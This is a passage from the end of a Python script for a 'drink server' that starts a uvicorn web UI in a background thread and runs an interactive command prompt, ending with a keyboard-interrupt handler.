        print(f"unknown command: {line!r}  (type help)")


def start_uvicorn():
    config = uvicorn.Config(app, host="0.0.0.0", port=WEB_PORT, log_level="warning")
    server = uvicorn.Server(config)
    server.run()


async def main():
    global loop
    loop = asyncio.get_event_loop()

    web_thread = threading.Thread(target=start_uvicorn, daemon=True)
    web_thread.start()

    print(f"drink server — web UI at http://localhost:{WEB_PORT}")
    print("type help for commands")

    await shell_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nbye.")
